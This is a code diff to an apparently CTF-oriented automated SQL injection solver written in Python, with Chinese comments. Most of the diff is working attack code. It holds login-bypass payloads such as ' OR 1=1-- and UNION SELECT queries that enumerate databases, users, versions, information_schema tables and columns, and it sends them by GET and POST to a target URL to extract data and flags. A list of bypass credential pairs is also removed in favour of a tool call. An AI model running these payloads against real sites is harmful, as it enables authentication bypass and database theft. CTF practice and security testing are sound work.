@@ -16,6 +16,7 @@ sys.path.insert(0, str(Path(__file__).parent))
 
 from src.utils.logger import setup_logger
 from src.mcp_server.tools.sqlmap_wrapper import SQLMapWrapper
+from src.mcp_server.tools.universal_password_injector import universal_password_injection_tool
 
 
 class CTFSolver:
@@ -63,7 +64,7 @@ class CTFSolver:
             "challenge_type": "sql-injection",
             "flags_found": [],
             "vulnerabilities": [],
-            "tools_used": ["sqlmap"],
+            "tools_used": ["sqlmap", "universal_password_injector"],
             "phases_completed": [],
             "success": False,
             "detailed_steps": []
@@ -200,6 +201,7 @@ class CTFSolver:
     async def _try_manual_payloads(self, target_url, results, username_param, password_param):
         """尝试手动payload"""
         import requests
+        import re
         
         # 首先尝试万能密码注入
         print("\n🔑 尝试万能密码注入...")
@@ -232,23 +234,37 @@ class CTFSolver:
             
             # 时间盲注payload
             f"admin' AND sleep(5)--",
+            
+            # 新增：更直接的payload
+            f"' OR 1=1--",
+            f"' OR '1'='1",
+            f"admin' OR '1'='1",
+            f"admin' OR 1=1--",
+            f"' UNION SELECT null,flag,null FROM flag--",
+            f"' UNION SELECT null,@@version,null--",
         ]
         
         print(f"尝试 {len(payloads)} 个手动payload...")
         
-        for i, payload in enumerate(payloads[:10]):  # 只尝试前10个
+        # 存储有效的payload
+        effective_payloads = []
+        
+        for i, payload in enumerate(payloads):
             try:
-                # 构建请求
+                # 构建请求 - 尝试GET和POST两种方法
                 params = {username_param: payload, password_param: "test"}
+                
+                # 首先尝试GET
                 response = requests.get(target_url, params=params, timeout=10)
                 
                 # 检查响应中是否包含flag
-                import re
                 flag_patterns = [
                     r'flag\{[^}]+\}',
                     r'FLAG\{[^}]+\}',
                     r'ctf\{[^}]+\}',
                     r'CTF\{[^}]+\}',
+                    r'[A-Za-z0-9]{32}',  # 32位哈希
+                    r'[A-Za-z0-9]{64}',  # 64位哈希
                 ]
                 
                 for pattern in flag_patterns:
@@ -262,135 +278,353 @@ class CTFSolver:
                         return
                 
                 # 检查响应中是否有数据库信息
-                db_keywords = ["mysql", "database", "sql", "syntax", "error", "warning"]
+                db_keywords = ["mysql", "database", "sql", "syntax", "error", "warning", "select", "union", "from", "where"]
                 if any(keyword in response.text.lower() for keyword in db_keywords):
                     print(f"  Payload {i+1}: 可能有效 (发现数据库关键词)")
+                    effective_payloads.append((i, payload, "GET", response))
+                
+                # 检查响应长度变化（与正常响应比较）
+                normal_response = requests.get(target_url, params={username_param: "test", password_param: "test"}, timeout=5)
+                if abs(len(response.text) - len(normal_response.text)) > 50:
+                    print(f"  Payload {i+1}: 响应长度变化 ({len(normal_response.text)} -> {len(response.text)})")
+                    if (i, payload, "GET", response) not in effective_payloads:
+                        effective_payloads.append((i, payload, "GET", response))
+                
+                # 尝试POST请求
+                try:
+                    post_response = requests.post(target_url, data=params, timeout=10)
+                    
+                    # 检查flag
+                    for pattern in flag_patterns:
+                        match = re.search(pattern, post_response.text)
+                        if match:
+                            flag = match.group()
+                            print(f"\n🎉 使用POST payload {i+1} 找到Flag: {flag}")
+                            results["flags_found"].append(flag)
+                            results["success"] = True
+                            results["phases_completed"].append("manual_exploitation")
+                            return
+                    
+                    # 检查数据库关键词
+                    if any(keyword in post_response.text.lower() for keyword in db_keywords):
+                        print(f"  Payload {i+1} (POST): 可能有效 (发现数据库关键词)")
+                        effective_payloads.append((i, payload, "POST", post_response))
+                
+                except Exception as post_error:
+                    pass
+                
+                # 检查是否有明显的SQL错误信息
+                error_patterns = [
+                    r"SQL syntax.*MySQL",
+                    r"Warning.*mysql",
+                    r"MySQL server version",
+                    r"unclosed quotation mark",
+                    r"quoted string not properly terminated",
+                ]
+                
+                for pattern in error_patterns:
+                    if re.search(pattern, response.text, re.IGNORECASE):
+                        print(f"  Payload {i+1}: 发现SQL错误信息")
+                        if (i, payload, "GET", response) not in effective_payloads:
+                            effective_payloads.append((i, payload, "GET", response))
+                        break
             
             except Exception as e:
                 print(f"  Payload {i+1}: 错误 - {e}")
-    
-    async def _try_universal_password_injection(self, target_url, results, username_param, password_param):
-        """尝试万能密码注入"""
-        import requests
         
-        # 万能密码payload列表
-        universal_passwords = [
-            # 经典万能密码
-            {"username": "admin", "password": "' OR '1'='1"},
-            {"username": "admin", "password": "' OR 1=1--"},
-            {"username": "admin", "password": "' OR 'a'='a"},
-            {"username": "admin", "password": "' OR ''='"},
-            
-            # 变体
-            {"username": "' OR '1'='1", "password": "anything"},
-            {"username": "admin' OR '1'='1'--", "password": "anything"},
-            {"username": "admin'--", "password": "anything"},
-            {"username": "admin'#", "password": "anything"},
-            
-            # 双引号变体
-            {"username": "admin", "password": '" OR "1"="1'},
-            {"username": '" OR "1"="1', "password": "anything"},
-            
-            # 无引号变体
-            {"username": "admin", "password": " OR 1=1"},
-            {"username": " OR 1=1", "password": "anything"},
-            
-            # 管理员万能密码
-            {"username": "admin", "password": "admin' OR '1'='1"},
-            {"username": "administrator", "password": "' OR '1'='1"},
-            
-            # 注释变体
-            {"username": "admin'/*", "password": "*/ OR '1'='1"},
-            {"username": "admin'-- -", "password": "anything"},
-            {"username": "admin'#", "password": "anything"},
+        # 如果有有效的payload，尝试进一步利用
+        if effective_payloads and not results["success"]:
+            print(f"\n🔍 发现 {len(effective_payloads)} 个可能有效的payload，尝试进一步利用...")
+            await self._exploit_effective_payloads(target_url, results, effective_payloads, username_param, password_param)
+    
+    async def _exploit_effective_payloads(self, target_url, results, effective_payloads, username_param, password_param):
+        """利用有效的payload进行进一步攻击"""
+        import requests
+        import re
+        
+        print("\n🔧 开始深度利用...")
+        
+        # 尝试提取数据库信息
+        print("1. 尝试提取数据库信息...")
+        
+        # 数据库信息提取payload
+        info_payloads = [
+            f"' UNION SELECT null,database(),null--",
+            f"' UNION SELECT null,user(),null--",
+            f"' UNION SELECT null,version(),null--",
+            f"' UNION SELECT null,@@version,null--",
+            f"' UNION SELECT null,@@datadir,null--",
+            f"' UNION SELECT null,@@basedir,null--",
         ]
         
-        print(f"尝试 {len(universal_passwords)} 个万能密码组合...")
-        
-        for i, creds in enumerate(universal_passwords):
+        for i, payload in enumerate(info_payloads):
             try:
-                # 构建请求参数
-                params = {
-                    username_param: creds["username"],
-                    password_param: creds["password"]
-                }
+                params = {username_param: payload, password_param: "test"}
                 
-                # 尝试GET请求
+                # 尝试GET
                 response = requests.get(target_url, params=params, timeout=10)
                 
-                # 检查响应中是否包含flag
-                import re
-                flag_patterns = [
-                    r'flag\{[^}]+\}',
-                    r'FLAG\{[^}]+\}',
-                    r'ctf\{[^}]+\}',
-                    r'CTF\{[^}]+\}',
-                    r'登录成功|登录成功|success|welcome|dashboard|admin',
+                # 检查响应中是否有数据库信息
+                db_info_patterns = [
+                    r"Database: ([^\s<]+)",
+                    r"Current database: ([^\s<]+)",
+                    r"Current user: ([^\s<]+)",
+                    r"Version: ([^\s<]+)",
+                    r"MySQL ([^\s<]+)",
+                    r"MariaDB ([^\s<]+)",
                 ]
                 
-                # 检查flag
-                for pattern in flag_patterns[:4]:  # 只检查flag模式
+                for pattern in db_info_patterns:
                     match = re.search(pattern, response.text, re.IGNORECASE)
                     if match:
-                        flag = match.group()
-                        print(f"\n🎉 使用万能密码组合 {i+1} 找到Flag: {flag}")
-                        results["flags_found"].append(flag)
-                        results["success"] = True
-                        results["phases_completed"].append("universal_password_injection")
-                        
-                        # 记录使用的payload
-                        results["universal_password_used"] = {
-                            "username": creds["username"],
-                            "password": creds["password"]
-                        }
-                        return True
+                        info = match.group(1)
+                        print(f"  ✅ 发现数据库信息: {info}")
+                        results["database_info"] = results.get("database_info", {})
+                        if "Database:" in pattern:
+                            results["database_info"]["name"] = info
+                        elif "user" in pattern.lower():
+                            results["database_info"]["user"] = info
+                        elif "version" in pattern.lower():
+                            results["database_info"]["version"] = info
                 
-                # 检查登录成功迹象
-                success_keywords = ["登录成功", "登录成功", "success", "welcome", "dashboard", "admin", "logout", "退出"]
-                if any(keyword in response.text.lower() for keyword in [k.lower() for k in success_keywords]):
-                    print(f"  ✓ 万能密码组合 {i+1}: 可能登录成功")
+                # 检查是否有明显的数据库信息在响应中
+                if any(word in response.text.lower() for word in ["database", "user", "version", "mysql", "mariadb"]):
+                    # 提取可能的信息
+                    lines = response.text.split('\n')
+                    for line in lines:
+                        if any(word in line.lower() for word in ["database", "user", "version"]):
+                            print(f"  可能的信息: {line.strip()[:100]}")
+                
+            except Exception as e:
+                pass
+        
+        # 2. 尝试提取表名
+        print("\n2. 尝试提取表名...")
+        table_payloads = [
+            f"' UNION SELECT null,group_concat(table_name),null FROM information_schema.tables WHERE table_schema=database()--",
+            f"' UNION SELECT null,table_name,null FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1--",
+        ]
+        
+        for payload in table_payloads:
+            try:
+                params = {username_param: payload, password_param: "test"}
+                response = requests.get(target_url, params=params, timeout=10)
+                
+                # 查找表名模式
+                table_pattern = r"[a-zA-Z_][a-zA-Z0-9_]*"
+                potential_tables = re.findall(table_pattern, response.text)
+                
+                # 过滤常见表名
+                common_tables = ["users", "admin", "flag", "flags", "user", "admin_user", "ctf", "challenge"]
+                found_tables = [t for t in potential_tables if t.lower() in common_tables or len(t) > 5]
+                
+                if found_tables:
+                    print(f"  ✅ 可能发现表名: {', '.join(found_tables[:5])}")
+                    results["tables_found"] = found_tables[:5]
+                    break
                     
-                    # 尝试POST请求（如果GET失败）
-                    try:
-                        post_response = requests.post(target_url, data=params, timeout=10)
+            except Exception as e:
+                pass
+        
+        # 3. 尝试从常见表中提取数据
+        print("\n3. 尝试从常见表中提取数据...")
+        common_tables_to_check = ["flag", "flags", "ctf", "challenge", "secret", "key"]
+        
+        for table in common_tables_to_check:
+            try:
+                # 尝试提取列名
+                column_payload = f"' UNION SELECT null,group_concat(column_name),null FROM information_schema.columns WHERE table_name='{table}'--"
+                params = {username_param: column_payload, password_param: "test"}
+                response = requests.get(target_url, params=params, timeout=10)
+                
+                # 检查是否有列名
+                column_pattern = r"[a-zA-Z_][a-zA-Z0-9_]*"
+                potential_columns = re.findall(column_pattern, response.text)
+                
+                # 过滤常见列名
+                common_columns = ["flag", "value", "key", "secret", "password", "hash"]
+                found_columns = [c for c in potential_columns if c.lower() in common_columns]
+                
+                if found_columns:
+                    print(f"  ✅ 在表 {table} 中发现列: {', '.join(found_columns)}")
+                    
+                    # 尝试提取数据
+                    for column in found_columns:
+                        data_payload = f"' UNION SELECT null,{column},null FROM {table}--"
+                        params = {username_param: data_payload, password_param: "test"}
+                        data_response = requests.get(target_url, params=params, timeout=10)
                         
-                        # 再次检查flag
-                        for pattern in flag_patterns[:4]:
-                            match = re.search(pattern, post_response.text, re.IGNORECASE)
+                        # 检查flag
+                        flag_patterns = [
+                            r'flag\{[^}]+\}',
+                            r'FLAG\{[^}]+\}',
+                            r'ctf\{[^}]+\}',
+                            r'CTF\{[^}]+\}',
+                            r'[A-Za-z0-9]{32}',
+                            r'[A-Za-z0-9]{64}',
+                        ]
+                        
+                        for pattern in flag_patterns:
+                            match = re.search(pattern, data_response.text)
                             if match:
                                 flag = match.group()
-                                print(f"\n🎉 使用POST请求找到Flag: {flag}")
+                                print(f"\n🎉🎉🎉 找到Flag: {flag} 🎉🎉🎉")
                                 results["flags_found"].append(flag)
                                 results["success"] = True
-                                results["phases_completed"].append("universal_password_injection")
-                                
-                                # 记录使用的payload
-                                results["universal_password_used"] = {
-                                    "username": creds["username"],
-                                    "password": creds["password"],
-                                    "method": "POST"
-                                }
-                                return True
-                    except:
-                        pass
-                
-                # 检查响应长度变化（可能表示成功）
-                if i == 0:
-                    baseline_length = len(response.text)
-                else:
-                    current_length = len(response.text)
-                    if abs(current_length - baseline_length) > 100:  # 响应长度显著变化
-                        print(f"  ⚠️  万能密码组合 {i+1}: 响应长度变化 ({baseline_length} -> {current_length})")
+                                results["phases_completed"].append("deep_exploitation")
+                                return
                         
-                        # 检查是否有数据库错误信息
-                        error_keywords = ["mysql", "sql", "syntax", "error", "warning", "exception"]
-                        if any(keyword in response.text.lower() for keyword in error_keywords):
-                            print(f"    发现数据库错误信息，可能存在SQL注入")
+                        # 检查是否有任何数据
+                        if len(data_response.text) < 5000:  # 不是错误页面
+                            # 提取可能的数据
+                            lines = data_response.text.split('\n')
+                            for line in lines:
+                                if any(word in line.lower() for word in ["flag", "ctf", "key", "secret"]):
+                                    print(f"  可能的数据: {line.strip()[:100]}")
+                                    # 再次检查flag模式
+                                    for pattern in flag_patterns:
+                                        match = re.search(pattern, line)
+                                        if match:
+                                            flag = match.group()
+                                            print(f"\n🎉 在数据中找到Flag: {flag}")
+                                            results["flags_found"].append(flag)
+                                            results["success"] = True
+                                            results["phases_completed"].append("deep_exploitation")
+                                            return
+                    
+                    break  # 如果找到表，就停止检查其他表
             
             except Exception as e:
-                print(f"  ✗ 万能密码组合 {i+1}: 错误 - {e}")
+                pass
         
-        return False
+        # 4. 尝试盲注提取flag
+        print("\n4. 尝试盲注提取flag...")
+        
+        # 首先检查是否有flag表
+        flag_table_check = "' UNION SELECT null,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%flag%' LIMIT 1),null--"
+        
+        try:
+            params = {username_param: flag_table_check, password_param: "test"}
+            response = requests.get(target_url, params=params, timeout=10)
+            
+            # 检查响应中是否有flag表名
+            if any(word in response.text.lower() for word in ["flag", "ctf"]):
+                print("  ✅ 发现flag相关表")
+                
+                # 尝试直接提取flag
+                direct_flag_payloads = [
+                    f"' UNION SELECT null,flag,null FROM flag--",
+                    f"' UNION SELECT null,value,null FROM flag--",
+                    f"' UNION SELECT null,* FROM flag--",
+                    f"' UNION SELECT null,(SELECT flag FROM flag LIMIT 1),null--",
+                ]
+                
+                for payload in direct_flag_payloads:
+                    try:
+                        params = {username_param: payload, password_param: "test"}
+                        response = requests.get(target_url, params=params, timeout=10)
+                        
+                        # 检查flag
+                        flag_patterns = [
+                            r'flag\{[^}]+\}',
+                            r'FLAG\{[^}]+\}',
+                            r'ctf\{[^}]+\}',
+                            r'CTF\{[^}]+\}',
+                        ]
+                        
+                        for pattern in flag_patterns:
+                            match = re.search(pattern, response.text)
+                            if match:
+                                flag = match.group()
+                                print(f"\n🎉 使用直接查询找到Flag: {flag}")
+                                results["flags_found"].append(flag)
+                                results["success"] = True
+                                results["phases_completed"].append("direct_flag_extraction")
+                                return
+                    
+                    except Exception as e:
+                        pass
+        
+        except Exception as e:
+            pass
+        
+        print("\n⚠️  深度利用完成，但未找到flag")
+    
+    async def _try_universal_password_injection(self, target_url, results, username_param, password_param):
+        """尝试万能密码注入 - 使用MCP工具"""
+        print("\n🔑 尝试万能密码注入（使用MCP工具）...")
+        
+        try:
+            # 使用MCP工具进行万能密码注入测试
+            tool_result = await universal_password_injection_tool(
+                target_url=target_url,
+                payload_type="all",
+                method="both"
+            )
+            
+            # 记录工具使用
+            results["tools_used"] = list(set(results.get("tools_used", []) + ["universal_password_injector"]))
+            
+            # 检查是否找到flag
+            if tool_result.get("flag_found"):
+                flag = tool_result["flag"]
+                print(f"\n🎉 使用MCP万能密码注入工具找到Flag: {flag}")
+                results["flags_found"].append(flag)
+                results["success"] = True
+                results["phases_completed"].append("universal_password_injection")
+                
+                # 记录成功的payload
+                if tool_result.get("successful_payloads"):
+                    first_success = tool_result["successful_payloads"][0]
+                    results["universal_password_used"] = {
+                        "username": first_success["payload"].get("username", "未知"),
+                        "password": first_success["payload"].get("password", "未知"),
+                        "method": first_success.get("method", "未知")
+                    }
+                
+                return True
+            
+            # 检查是否有成功的payload（即使没找到flag）
+            elif tool_result.get("successful_payloads_count", 0) > 0:
+                print(f"✅ MCP工具发现 {tool_result['successful_payloads_count']} 个有效的万能密码payload")
+                
+                # 记录成功的payload信息
+                results["universal_password_results"] = {
+                    "payloads_tested": tool_result.get("payloads_tested", 0),
+                    "successful_payloads_count": tool_result.get("successful_payloads_count", 0),
+                    "successful_payloads": tool_result.get("successful_payloads", [])[:3]  # 只记录前3个
+                }
+                
+                # 虽然没有找到flag，但发现了有效的注入点
+                # 可以尝试进一步利用这些成功的payload
+                print("🔧 尝试进一步利用成功的payload...")
+                
+                # 如果有成功的payload，我们可以尝试使用它们进行进一步攻击
+                successful_payloads = tool_result.get("successful_payloads", [])
+                if successful_payloads:
+                    # 使用第一个成功的payload进行进一步测试
+                    first_payload = successful_payloads[0]
+                    payload_data = first_payload.get("payload", {})
+                    method = first_payload.get("method", "GET")
+                    
+                    print(f"  使用payload: {payload_data} ({method})")
+                    
+                    # 这里可以添加进一步的利用逻辑
+                    # 例如：尝试提取数据库信息、表名等
+                    
+                    # 标记为部分成功
+                    results["phases_completed"].append("universal_password_injection_detected")
+                    return True  # 返回True表示发现了注入点
+            
+            else:
+                print("❌ MCP万能密码注入工具未发现有效的注入点")
+                return False
+                
+        except Exception as e:
+            print(f"❌ MCP万能密码注入工具执行失败: {e}")
+            import traceback
+            self.logger.error(f"MCP工具错误: {traceback.format_exc()}")
+            return False
     
     async def _generate_report(self, results):
         """生成解题报告"""
